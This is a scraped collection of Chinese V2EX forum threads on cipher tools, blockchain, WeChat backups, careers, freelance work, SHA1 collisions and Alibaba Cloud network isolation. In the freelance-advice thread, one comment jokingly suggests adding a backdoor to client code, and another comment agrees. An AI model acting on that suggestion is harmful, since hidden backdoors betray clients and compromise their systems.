{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>判断密文的小公具,输入密文能识别的那种..</p>\n</div></div>"], "reply": "4", "tittle": "v 友有推荐的密文判断小工具吗", "comment": ["能判断也就是按密文长度了啊，没啥意义吧。", "hash-identifier\r", "然并卵", "同求，求到了麻烦 @ 我谢谢露珠", "刚刚查了一下，上面那个工具过时了，可以用这个替代\r"]},
{"content": ["<div class=\"topic_content\">中国软件杯（ <a target=\"_blank\" href=\"http://www.cnsoftbei.com/%EF%BC%89%E8%B5%B7%E7%A0%81%E7%AE%97%E6%98%AF%E4%B8%AA%E5%9B%BD%E5%AE%B6%E7%BA%A7%E7%9A%84%E5%A4%A7%E5%9E%8B%E8%BD%AF%E4%BB%B6%E6%AF%94%E8%B5%9B%E4%BA%86%E3%80%82\" rel=\"nofollow\">http://www.cnsoftbei.com/）起码算是个国家级的大型软件比赛了。</a>\r<br>在今年 2017 的题目中看到了区块链相关应用的题目\"基于区块链的电子证照库应用\"，说明了区块链技术被进一步接受。\r<br>同时这对比特币的发展有没有什么积极的影响呢？</div>"], "reply": "26", "tittle": "中国软件杯竟然出现了区块链相关题目", "comment": ["我感觉对以太坊的影响大一点", "竟然吗？我觉得是必然。看看现在区块链有多热，连学校里的课程和专业都火。\r", "\r", "再加一条新闻：今日招商银行宣布，招商银行在区块链技术上实现了新的突破，首家实现将区块链技术应用于全球现金管理（ Global Cash Management ）领域的跨境直联清算、全球账户统一视图以及跨境资金归集这三大场景。", "这题是江苏星网软件公司出的题\r", "一家政务软件公司", "怎么“竟然”了？去年央行不是还招聘 区块链技术 研究人员么？", "不奇怪，央行很久以前就开始研发区块链相关技术了\r", "希望能出现有政府信用背书的加密货币", "  政府信用背书的加密货币。。还是中心化货币 和现在的人民币有什么区别？", "都在研究状态吧，估计会很火", "补一条新闻，央行的数字货币已经试运行。 ", "火不火和你无关。。。。", "去年还有个赛题是实现 AlphaGo", "工信部去年就已经发布了《中国区块链技术和应用发展白皮书》", "这个也没啥吧", "看这域名也是醉了", " 咦？我不记得去年有这么个题目啊。", "我觉得只是政府不想在去中心化的电子货币大范围流行起来的时候太被动吧，并不代表会支持这东西发展", "超级账本和以太坊都不错，我自学了半年了", "比特币现在的设计与法律相违背，怎么可能有不可以被追溯和匿名的交易，这个和国家的实名制政策走太远\r", "\r", "区块链想在国内落地第一件事就是改成全实名", "目标实名去中心交易", "招行 不是都应用了区块链技术了..", "就说一句：\r", "我国推行的是货币电子化，而不是接受非官方性质的电子”货币“。", " \r", " \r", "\r", "Teahour 有一期介绍以太坊的。是这样的，区块链对于金融行业最有价值第五一个点之一是低延迟跨境结算（比如跨境汇款）。可以让手续费很高的过去变成手续费低，速度快。", "我能吐槽一下域名吗？", "这域名绝对领导拍板了，要是程序员绝对会用 cnsoftcup ，领导一看啥玩意， cup 还是换乘 bei 比较贴近生活\\(^o^)/~", " 所以呢，都有传言限制个人兑换外汇了，你还想优化跨境结算？", "这网站让人沉醉，还是先比一比谁能做出更好的软件杯官网吧", "如果这些技术能消灭地沟油还不错，"]},
{"content": ["<div class=\"topic_content\">刚刚更新了 Mac 版微信，可以支持聊天记录了，试了下感觉还不错。但是有个问题，虽然我备份完成了，但是不知道备份到哪里去了？在本地还是不安全，想备份到 Dropbox ，有知道微信聊天记录存放地址的么？</div>"], "reply": "7", "tittle": "微信 Mac 最新版支持微信聊天记录了，有什么办法将本地聊天记录备份到 Dropbox 上么", "comment": ["支持备份和恢复聊天记录", "~/Library/Containers/com.tencent.xinWeChat/Data/Library/Application\\ Support/com.tencent.xinWeChat/2.0b4.0.9/Backup/", "然而微信的消息和手机微信总是不同步，丢东西很多", " 是通过桌面端的微信来备份手机上微信的记录，不会丢记录的", "总之先在本机备份一下了。", "用 weBack 吧，只需要 iTunes 备份。", " 这个 DB 文件请问有什么办法可以提取里面的信息呢?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>故事的后半部分：</p>\n<p>var a=\"116105110121109108046099111109\";var b=\"\";for(var c=0;c&lt;30;c=c+3){b+=String.fromCharCode(parseInt(a[c]+a[c+1]+a[c+2]));}b;</p>\n<p>请大家不要把这段 js 的解释结果贴在留言里，谢谢。</p>\n<p>去年的故事： <a href=\"https://www.v2ex.com/t/255287\" rel=\"nofollow\">https://www.v2ex.com/t/255287</a></p>\n</div></div>"], "reply": "5", "tittle": "把去年的故事讲完……", "comment": ["\r", "\r", "\r", "\r", "\r", "必须赞一下。👍\r", "\r", "不过需要 Erlang 环境才能运行，似乎会限制它的使用，如果能多一些语言支持就好了。", "var a=\"116105110121109108046099111109\";var b=\"\";for(var c=0;c<30;c=c+3){b+=String.fromCharCode(parseInt(a[c]+a[c+1]+a[c+2]));}b;", "..楼主你看看 Asciidoc 怎么样", "继续支持"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>有点累了</h2>\n<p>工作 3 年了，工作过的公司数目说起来可能有点好笑：只呆过两家公司。</p>\n<p>每一次辞职都像和女朋友分手一样依依不舍，说出辞职的时候有点伤感，毕竟都跟同事感情不错了。原本想极力维护跟同事的关系，但都因为不常见面了而渐渐的疏远淡忘了。</p>\n<p>这次确实是不得不辞职，希望得到更好的发展，不希望被安逸的环境困住。</p>\n<p>老东家的情这辈子恐怕是不敢淡忘了：接纳了当时懵懂的我，让一人我在这座陌生的城市得以立足、成长。如今我觉得我可以了，我希望飞的更高。所以不得不像断翼般狠下心来。</p>\n<p>今后的目标是：看的书在多一些，虽然也曾读过不下几本书但是仍然觉得不够。同时也希望能更有主见，不跟随。</p>\n<p>生活中的累真的只有自己才能体会到，我喜欢用音乐来抒发情感。</p>\n<p>张学友唱出了我的失恋之痛。</p>\n<p>李宗盛唱出了我生活中的累。</p>\n<p>听歌能哭出来确实不是乱说的，当歌曲和你产生了一种共鸣的时候确实会落泪。</p>\n<p>我很喜欢李宗盛，我推荐大家一首歌：《山丘》这首歌真的不错。</p>\n<p>当然还有 MV 一支。这支 MV 真的制作的很精良\n<a href=\"http://v.yinyuetai.com/video/738218\" rel=\"nofollow\" title=\"山丘 MV\">山丘 MV</a></p>\n<p>找一个好的团队也是在下的当务之急，但是更是希望能放松一段时间，跟自己说一声谢谢。</p>\n<hr>\n<p>这些文字是我在这一个普通夜晚的一些碎碎念，在魔都漂有些话只能对不认识的人说，大家只当看过就好了。\n感谢 v2 提供了这个平台让我能抒发出一些情感。</p>\n<hr>\n<p>会伤悲，不后悔。</p>\n</div></div>"], "reply": "110", "tittle": "辞职了，有点累，想休息下。", "comment": [" 两年到高级工程师，也是很厉害！", " 我也差不多，领导说最近有点忙，希望我体谅一下他晚点走，也是不好意思", " 自由职业在做啥？", " 半年以来，刚开始是在开发 APP ，后面觉得挣不到钱（个人觉得独立开发者开发一个挣钱的 App 很难），现在在做国内的推广联盟（京东、淘宝这些），平时接一些单、卖服务器，维持一下生活和自己的项目", " 这有什么不好意思的，不好意思是害了自己。", "感觉像初中生的无病呻吟", "在目前的公司快 3 年了，想出去看看了", " 服务器怎么卖？是 VPS 嘛？", " 利用信息不对称去挣钱"]},
{"content": ["<div class=\"topic_content\">如题， Tower 的客户端一年多没更新了，完全就是一个 H5 的产品，跟其他工具比起来差的有点大啊。。。是不是放弃了？\r<br>\r<br>我有更换的想法，但是用了 2 年多了，我自己已经习惯了，团队其他人想不想换还不好说，换的话也很麻烦，能不换就不换啊。。\r<br>\r<br>跪求 Tower 的同志们速速更新，起码手机端达到能用的水平啊。。。\r<br>\r<br><img src=\"http://ww1.sinaimg.cn/large/0060lm7Tgy1fcp653qds7j30yi1pcgte.jpg\" class=\"embedded_image\"> </div>"], "reply": "17", "tittle": "Tower 手机客户端是不是放弃了？一年多没更新了", "comment": ["Tower 现在把重心是不是放在了 H5 上？", "一直更新就不积极", "coding 的安卓客户端倒是开源了", "微信端也有，某次同事用微信回，把我吓一跳 =-=", "Android 端老是提示出错，还能用吗？", "前员工发来贺电 →_→ 据说在憋大招？？？", " 微信端很早就有了", " 安卓的没用过啊， ios 的基本不可用啊，功能还没有 web 版 1/5 ，要什么没什么，完全就是一个 H5 加个壳子", " 憋啥大招？起码客户端得做好啊。。。就这还怎么收费。。。", " 我怎么知道。为啥要收费？服务老百姓不好吗？", "估计融不到钱，快....", "钉钉里不是有个 tower 么", " 钉钉和微信都有", "tower 的人都跑去做 [知人] 了，他们团队的新产品，面向企业人力资源的产品。\r", "不过貌似 [知人] 差不多了，所以现在 PC 的版本也在更新了，其实很长一段时间内 PC 网页版都没啥更新没啥亮点。", "过去三个月里， 52% 的 Tower 活跃用户会通过手机使用 Tower ，而这其中只有 0.226% 是通过 Tower 移动端 App 访问的，但是大家 *几乎* 都会通过微信（另外部分钉钉）来使用 Tower.\r", "\r", "另一方面，在过去，我们的确在移动端 App 上投入不够， App 的更新一直跟不上桌面版的节奏，导致用起来体验很差，甚至已经不如微信内的网页版了，所以我们在上上周，直接从 AppStore 和各大安卓市场下架了。\r", "\r", "对仍然在坚持使用 Tower 移动端 App 的同学，我们向你道歉，短期内，我们不会重新上架，我们推荐各位使用微信版 Tower （关注服务号 Tower 登录即可，我们不会推送广告信息），如果你不用微信，直接网页访问 ", " 也可以，只是无法通过微信收取通知了。\r", "\r", "我们现在正在做一个大版本的更新，新版本里项目里的很多交互发生了改变，手机网页上实现起来成本很高并且不一定好用，所以移动端 App 会是 Tower 未来的重要组成部分，在新版本 Tower 发布时，移动端 App 也会一同更新并重新上架（预计会是今年夏末），未来一定不会让各位像过去两年一样这么辛苦了。", "> @", " 估计融不到钱，快....\r", "\r", "放心， Tower 已经不需要融钱了，可以自给持续发展了。", "> @", " tower 的人都跑去做 [知人] 了\r", "\r", "Tower 和知人会拆成两个独立的公司（知人已经拆出去了），都会有自己的全职员工，并不会出现「 tower 的人都跑去做 [知人] 了」这样的事情（了）。"]},
{"content": ["<div class=\"topic_content\">求助各位大佬，帮我指一条明路\r<br>\r<br>个人情况： 18 年应届研究僧，双 985 ，计算机专业，但是学习并不是很好...现在面临找工作的难关，陷入了深深纠结中...\r<br>1.有过 iOS 开发经验，做个 3 个项目，但是因为是自学所以做的比较简单，说白了其实就是在堆功能而已\r<br>2.没有 web 前端的经验，但是个人比较感兴趣所以最近在自学，却又十分担心找不到工作....\r<br>现在感觉很难下定决心选哪一条路，由于 iOS 也荒废了一段时间，所以其实也没什么优势，最新的技术啥的也不是很懂，但是毕竟有项目经验； web 前端纯靠兴趣，现在才刚刚入门而已，感觉找工作会比较困难。另外又觉得前端会是一个比较热的方向并且发展的很快，而 iOS 初级市场已经饱和，自己离高级又差的远....想请教各位大大，按照我目前的情况（目标就是找个不算太差的工作），选择哪个会更好一点，更利于发展？</div>"], "reply": "27", "tittle": "前端还是 iOS？", "comment": ["iOS 的项目是啥", "研究生大佬就不要来和我们抢饭碗了……", "前端活多", "iOS 和前端真是千军万马过独木桥", " 很简单的项目，没什么难点的那种、有一个是商家查看自己销售情况的，一个是公司管理自己公司的项目和员工动态的，还有一个是报警的 app ，可以上传现场情况的那种", " 见过什么都不会的研究生吗？恐怕水平不如培训班出来的", " 活多的意思是工作强度大还是工作机会多？", " 感觉研究生白读了还不如本科毕业就找工作还没现在压力大呢", "18 年应届研究僧，双 985 ，计算机专业\r", "= =为什么什么都不会？好奇楼主本科+研究生怎么过。。。。 iOS 和前端真心对不起楼主 cs 研究僧的基础，你说你想搞大数据，人工智能， AR 之类还对得上群众的期待", " 混着过..哭泣...本科就不说了，大家都是水水的，只有少数学霸真心热爱编程。研究生没选好实验室吧，没什么项目，也没有研究方向，偶尔有些项目就是安卓开发一类的...于是混着混着发现混不下去了", " = =按道理这年头 IT 大热，不应该啊，多少人却个 985 学历", "为什么现在都是快找不到工作的时候就想来试试前端了？？？", "按我刚出来的时候，前端的工资是没有后端工资待遇好的。而且，前端 相对来说 对算法 设计等来说，没有那么高的要求。 这么好的编程基础，建议不要来前端。 之前的火是病态的， 回归正常之后 前端 还是偏弱的。 如果你只是想找份工作，并不是特别大的兴趣，建议不要做开发吧，别只看眼前的待遇，其中的辛苦，只有自己知道。要知道自己适合做什么。", "这个背景随便挑一样，然后去大厂里学习学习，然后就可以走上人生巅峰了。", "试试投大公司 比如 IBM SAP 四大的 IT 部门 金融公司，它们看学历的，不怎么看什么项目经验 也正好卡掉（动手能力强但学历不强的）本科生，卡掉本科生这样竞争小点儿", "不喜欢编程就别进入这个行业了", "建议投下大公司，虽然这行看技术，但是楼主学历会加分", "坐标？非一线城市，大多数前端岗位还是在做切图，画活动页的无聊工作，不如搞 iOS 。有渠道能找个敞开玩 node.js ， SPA 框架，项目偏后台，数据展示的公司，可以考虑入前端的坑，炒鸡好玩！天天沉迷学习，女朋友都不想要了😂", "前端初级比 iOS 初级还不受待见。", "有底子当然稳扎稳打后端，平时捣鼓捣鼓前端，最后就全桟啦。", " 因为前端上手快...当然越往后越难只是现在还没到难的阶段", " 谢谢你，我会仔细考虑的", " 多谢大大安慰😂", " 嗯嗯，好的，看来我还是需要加强基础", " 其实也不算完全没兴趣，不然也不会选择读研这条路，何必浪费四年又三年...只是一开始学的时候学的不扎实，虽然成绩尚可，但没有真正学进去", " 这是一线城市偏见，我去年刚从深圳回某二线，面试的公司没有一家说只要你切图就来，基本上考的都是目前流行框架、 nodejs 、 es6 、面向对象， css 什么的基本上都是顺带。", "和楼主一样的迷茫 但是我只是个 211 本科生， 学历一般水平有限 在纠结是考研还是找工作"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>作为一名猿，私下第一次接项目有什么要注意的地方吗？ 因为之前都是按部就班的工作，现在有这个机会，想尝试一下，不知道有什么需要特别注意的地方？</p>\n<p>如果项目能接，是不是要先收取一部分定金；\n还有这种私下做项目的情况，是否需要签合同；\n开发周期如何把握，如果没按时完成是否需要负什么责任，等等；</p>\n<p>想向 V2 的朋友有这方面经验的请教一下，不胜感激！</p>\n</div></div>"], "reply": "28", "tittle": "程序猿一枚，业余时间内想接手私活。现在有朋友推荐了项目，近期将见面详谈，第一次接项目有什么要注意的地方吗？", "comment": ["钱怎么给，一般分三期，先给一部分，开发完交付给一部分，验收完给一部分， 532 或者 433 或者 343 352.。。。。好像有点像足球站位了。。", " 哈哈，很幽默，谢谢建议， 感谢币已发送。", "签合同。合理预估项目周期，明确重要的时间节点，如果需求更改一定加时间！！", "最要紧的是你得先预估好项目难度，以及自己确切的时间宽裕度，是否有能力，有确定的时间来做，别把自己和别人都带进坑里。", "(1)签合同\r", "(2)查验对方身份 别最后给个假名都不认识\r", "(3)估算工作量往不靠谱的估 一般想着 1 天做完的做出来都要 pi 天 不靠谱的 10pi 都藕", "未结算尾款前别给源码。", "需求文档明确。\r", "合同对你没用。\r", "预付款非常重要。\r", "不拿尾款不给代码。", "哦，给源码和不给源码的价格也不一样", " 这也不一样啊，果然老司机，老哥稳。", " 我觉得要不要合同也无所谓，主要得保证酬劳到手就行，毕竟这也是血汗钱。", " 嗯嗯，是的，是要好好衡量衡量。", "需求一定要明确，以免后期频繁变更。合理规划项目周期。", "1.分期交付（这样的话改需求其实不是问题了），没收到钱之前别给货，可以远程验证。\r", "3.能签合同尽量签，起码保留交流的文字记录，电话沟通也尽量录音。\r", "4.程序使用全，程序版权，代码使用权，程序员版权价格完全不同，虽然对咱们没啥区别，但是可以用来抬价。", "合同写死开发需求 验收阶段修改、新需求 严格按照合同约定标准收费", " 对你区别大了，有那种恶心人的，交付的时候找所谓专业公司“检查”你代码，然后说你这里有漏洞，那里文档不全，这里注释覆盖不够，各种理由不结钱", "找个朋友一起做项目", " 这个没办法完全避免的，分期和远程验证可以减少风险。", "报价 ，了解功能，估工时，估价\r", "合同， 还是签一个合同吧，如果是新的过的朋友，可以不签，否则，签一个为妥；\r", "付款， 我一半都是先付 50%，验收完成 40%，部署上线后 10%\r", "\r", "就这 3 点，慢慢研习", " #15 正常的，换个角度思考，甲方提出的问题，在合同范围内的，都应该解决，直到客户满意。", "如果能把需求定死最好...不要相信对方“善意”的：我也不知道需求，你按着做这一套", "诚信为本", "加个后门，其他的自由发挥。", " +10086", "要求有需求文档，明确需求。\r", "不然改来改去会占你极大的工作量。", "It must have clear document and requirements. Have a good day.", "1.金额分为： 30 ， 85 ， 15\r", "推荐这样，因为绝大部分的外包项目最后都不会真正用起来，而不会真正用起来意味着他会种种理由拖着你的尾款，\r", "2.明确功能逻辑需求：\r", "因为很多时候他们也不懂，可能做着做着就加点东西了。所以你要提前明确好，加的话，评估，多钱，不然无止尽的需求和变更逻辑。\r", "3.合同这个东西还是要有的，常规手续不能少", "一定要正规合同。\r", "一定要预付款，可 30 30 30 10 。且按时间节点给钱。如果哪个时间节点没有付款，不干了。这也要写合同里。\r", "如果开工后有新的要求，附加部分也要定立合同。\r", "\r", "\r", "最后，要是真合作不愉快，不要吵得厉害打起来，我们二楼的小伙子过年火气大在问客户要钱时被打断了骨头钢板还没取。轻伤三年起。", "我一般是确定下来，看需求明确度如何，如果需求很明确，那就先收定金，然后开始干，中途的任何修改或者增加功能，都需要按照工期预算价格加钱，千万不要以为就改一点点无所谓，那样的话他们就会没完没了的改动，和原需求变化非差大，比如从一个小企业站变成了一个商城站。合同最好是签。不签的话，代码给出去的话尾款没有合同不好要。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"http://p1.bpimg.com/567571/31c335fa203b16c8.gif\"></p>\n<p>之前的文章： <a href=\"https://www.v2ex.com/t/336932#reply31\" rel=\"nofollow\">https://www.v2ex.com/t/336932#reply31</a></p>\n<p>项目地址： <a href=\"https://github.com/JingDa-open-source-community/go-home\" rel=\"nofollow\">https://github.com/JingDa-open-source-community/go-home</a>\n顺便跪下求个便宜好用的图床服务，免费的快崩溃了，各种幺儿子。\n顺便跪下求个便宜好用的图床服务，免费的快崩溃了，各种幺儿子。\n顺便跪下求个便宜好用的图床服务，免费的快崩溃了，各种幺儿子。</p>\n</div></div>", "<div class=\"topic_content\">低程图还需要处理，如果发现 bug ，不要怪我哈。</div>"], "reply": "35", "tittle": "写了个火车中转查询，目前测试下来效果秒杀 携程，去哪儿， 12306", "comment": ["  前两天 V 友发的。", "如果需要，通过算法计算出最优线路，性价比最高路线，这个是刚需", "题主留个联系方式，\r", "有一个学校强制注册的学生空间，里面图库文件库直接外链\r", "事业单位运营，你懂得", " 这个是业务层的东西了，可以处理一下，限于 terminal 展示有限，这个就不加了。如果是 web 或者移动端效果就很漂亮。", " 不明白你的意思", "支持一下，咱俩应该公用了一个名字 =_=", "公用—>共用 =_=", " 谢谢支持，那个共用什么名字啊？", "不知道跟飞猪的比效果是不是更好", " 谢谢", " 谢谢", " 可否给过链接", "楼主永修人？", " 恩", "干得漂亮，赞", " 谢谢啦", "可以试试 《盛名列车时刻》 的中转功能 ：）", "不错。 如果加个壳 就可以做成软件了啊。", "还是自己做吧", " 恩，是的。", "支持！！之前一版就 clone 了，很赞", " 老乡喔", " 欢迎提 pr", " 是吧，一中的？", "要是能自动刷票余额 提醒就好了~", " 这是个好建议，但是考虑到 terminal 展示有限，还是暂时这样吧，如果有移动端可以对接，这个事情就可以做了。", " 我尝试过用 go 写了个简单刷新 结果被 ban 了 网页版的 好像端口有访问速率限制 尴尬", "挂代理呢？", "很棒啊 star 一下慢慢看看", "如果可以抓到行驶公里数建议加上行驶公里数的比较，永修到北京最佳方案肯定不是到南昌转车，南昌到北京的高铁要么走杭州，要么走长沙，没有一个是直接北上的，又贵又慢，不管是从价格还是时间上都不如飞机\r", "\r", "如果到武汉转车直接上京广高铁就快多了。", " 恩，行驶公里数可以抓，但是数据比较多，初始化的时候就需要一些时间，嫌弃麻烦就没有这么做了，我是永修人，我们转车都是去南昌转车。我刚才看了一下数据，高铁确实如你所说，没有直接北上的，但是其他车次是有直达的。如果是这样的话，推荐的路线就要分位两条，一条是去武汉坐高铁，一条是南昌坐 z ／ k ／ t 。总而言之你的意见非常好，谢谢了！", " 一起进步！", " 或者我觉得，时间最短的和价格最优的中转站都是广大人民群走切实需要的。", " 比飞猪好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>怎么添加 gtk#3 的选项，还有 gtk#3 和 gtk#2 有什么不同呢</p>\n</div></div>"], "reply": "1", "tittle": "[求助] 想要用 monodevelop 开发 gtk#3 的程序", "comment": ["GTK#3 完全是半成品，没法用的。 C#猿要用 GTK 不如学 Vala ，语法差不多的，而且对象系统就是 GObject ，和 GNOME 系契合度极佳，正相当于 Windows 上 C#的地位。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://www.solidot.org/story?sid=51489\" rel=\"nofollow\">http://www.solidot.org/story?sid=51489</a></p>\n<p>不知道有人发过了吗？</p>\n</div></div>", "<div class=\"topic_content\">去知乎干了一圈，发现 sha1 真的死了。\r<br>\r<br><a target=\"_blank\" href=\"https://alf.nu/SHA1\" rel=\"nofollow\">https://alf.nu/SHA1</a>\r<br>\r<br>上传 2 张图片，可以立刻生成 2 个相同 sha1 的 pdf 文件，这根本不是几百年，而是秒级生成。</div>"], "reply": "10", "tittle": "SHA1 碰撞攻击的第一位受害者： WebKit 版本控制系统", "comment": ["SVN 已经出这种事了，感觉 Git 可能也会出事……", " linus 已经说过不会了", " 但有一部分人是那些拿 SVN 协议操作 Git 库的人，可能会发现自己文件出错了……\r", "自己刚刚试了下的确是这样子。\r", "\r", " 文件不能共存在 git 仓库中 其他问题到没有", "所以加速淘汰 SVN?", "SHA1 攻破我觉得影响有限，我每次下载文件的时候对比的是 sha1 和 md5 两个，我觉得不同文件 md5 和 sha1 同时相同的可能性太小了。", "svn 是封闭的， 将搞事者干掉即可。", "git 的 sha1 实际上是 文件类型（ blob commit tree ）+空格 +文件长度 +NUL+文件内容 然后 hash ，按照谷歌的 sha1 攻击方案不太好弄，其他的就不知道了。", " https 证书高风险。 chrome 好像是 4 月就会直接对 sha1 签名的证书报不安全。\r", "\r", "大体看了几个网站，都是 sha256 的。\r", "根证书好像都是 sha1 ，不过这个应该没问题，都是浏览器内置的。"]},
{"content": ["<div class=\"topic_content\"><img src=\"http://ww2.sinaimg.cn/mw690/490850e0jw1fd3mt7oefhj20u01hcwqq.jpg\" class=\"embedded_image\"> </div>"], "reply": "34", "tittle": "关于租户内网是否隔离，大神打架了", "comment": ["不给链接怎么看", "不明觉厉占个楼", "属于家务事", "求链接", " 这明显是微博嘛", "阿里云有租户隔离？？？", "不明觉厉，我只关心最下面那文章", "“@哨兵机器人：阿里云经典网络，同一地区本质是物理相通的，一般企业设置内网 10.0.0.0/8 允许的话，整个大区域都是互通的; redis 基本配置要素，最小权限访问，只开放给需要访问的源 IP 机器，模版控制防火墙配置，同时把 /root/.ssh/ 文件夹 锁定，禁止写入，一旦有文件写，即可报警 总之 我们这边就是这样处理的  ", "  \"", "没啥好打架的，看过内网章博士对耗子的评价，就知道到底谁在做实事了。硬要说谁是大神的话，只能说有一个是嘴炮大神了。", " 求详细...\r", "感觉陈皓是现在少数几个会写技术文章的人之一了...\r", "其他要么写得没几个人看得懂,要么万年入门级别....", "连鸟哥都开始喷耗子哥了", " 章博士的文章是照妖镜吗？要么就直接贴出来。\r", "从我使用经历\r", "阿里云的 vpc 设计推翻了不止一次吧？即使现在的架构水平，跟 5 年前的 aws 恐怕也是不能比的。\r", "另外，阿里云盾宣传那么厉害，但是对 redis 这样的漏洞没有应对措施，对新手来说基本是放任的", "阿里定义网络没有一千万不敢乱用……", " 请明说", "阿里云的 IP 一年一换我就感觉阿里的网络架构设计有问题", "公司内网属于机密，贴出来直接开除，任何公司都是如此；章博士当然不是照妖镜，但却是耗子的老板，我觉得应该分量够了。\r", "阿里云本身怎么设计我不评价，也和我说的话没啥关系，嘴上喷喷谁都会并不需要水平。", " 是这篇文章吗？\r", "“左耳朵耗子的主管， LVS 项目作者章文嵩博士在内网发的对左耳朵耗子工作业绩的评价” ", "本来一个区域下内网就是互相访问的，不然你买的 rds 和 ecs 怎么互联？", "谁的锅？不是我。扔给运维吧", "阿里云有隔离，非自己的主机无法通过内网访问", "几年前经典内网下不同账号之间的 ecs 是无法互访的。", "怎么这么巧，我们公司内网裸奔 redis 也被比特币干了。", "下意识的看了下微博发送的时间， 2017 年 2 月 24 日，还在拿四年前的思维看现在的阿里云，真是可笑\r", "\r", "不管是经典网络还是 VPC ，租户隔离早就完成了，不信的自己买个机器测试去", " 老板指出了没完成任务的结果以及他说出的原因，然而看 @", " 贴的文章，然而这原因并不单纯", " #6 \r", "默认安全组规则内网是不允许任何互访的 公网是 allow all 的\r", "貌似手贱的写了个 allow 10.0.0.0/8 all port 的规则然后喊内网互通危险的逻辑我是搞不懂\r", "\r", "反正不隔离的特性对我很重要，内网授权服务器类应用，所有客户都是不同账号\r", "\r", "手动开了个例外以后然后喊不安全的实在搞不懂脑袋被啥挤了", " rds 不是“另一个租户”，而是“公共设施”", "看贴一愣一愣的，简直有如宫斗戏。", " ", " 那个回答貌似还有你的回复", "租户隔离不是很早就搞了么", " \r", "```\r", "阿里云本身怎么设计我不评价，也和我说的话没啥关系，嘴上喷喷谁都会并不需要水平。\r", "```\r", "\r", "我们毕竟是阿里云用户, 遇到了阿里云的问题, 提出了问题, 想了解一些现状和避免的措施. \r", "你完全可以去内网好好了解一下阿里云的问题, 然后出来科普反驳, 而不是用内网的权威文出来指责某些阿里的\"叛徒\".", " 关于 VPC 隔离这件事本身，已经有官方文章了 ", " 术业有专攻，我不搞这个，没能力做这个科普。\r", "我评论的只是标题里“大神打架了”这个而已。", " 文章讨论的是阿里云用户的隔离, 左耳也回了一篇 ", "\r", "vpc 的确是网络隔离的目前最优的方案, 但是阿里云这么大的经典网络存量用户当前的确是不安全的, 文中的漏洞相比我 2015 年用阿里云时了解的, 感觉阿里云基本上没有做什么(经典网络)安全上的改进. \r", "所以标题下贴图的内容是真的.", " 我再次重申不讨论这个事，我也是门外汉。但就上面某个网友贴的链接，耗子在阿里云时主动**不参与**VPC 项目，现在来喷这个，感觉非常的呵呵。有功夫喷人，不如花时间做事。问题这么多，就是缺人做事啊。他在的时候不吱声不做事，走了到处喷，到底是大神还是大婶，自己判断吧。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/loveoge/pjax\" rel=\"nofollow\">https://github.com/loveoge/pjax</a></p>\n<p>比较的简单,前些天突然发现有 pjax 这东西,然后网上一搜后给整成文件,大家自己看吧</p>\n</div></div>"], "reply": "10", "tittle": "pjax 的简单应用", "comment": ["感谢分享", "感谢分享 和官网例子啥区别", "这个技术大概距今五年，属于上上一代的思想。", " 那这代的技术是怎么样的呢", " 我这打不开官网不知道有什么区别", " API+SPA", " 搜索了一下没弄明白是什么， spa 是什么呢", " SPA 是单页应用（ Single Page App)，只有 HTML+JavaScript 和 CSS 。通过 HTTP 协议的 API 和后端进行数据交互，后端只提供 JSON 或者 XML 等数据，不做页面渲染的事情，页面渲染由前端浏览器完成。", "也算不上上上代吧。\r", "\r", "如果说这代是 vue react 的话\r", "\r", "上代是 angular1 那些个框架？ pjax 印象中和 angular1 差不多时间，还有些重叠。"]}
]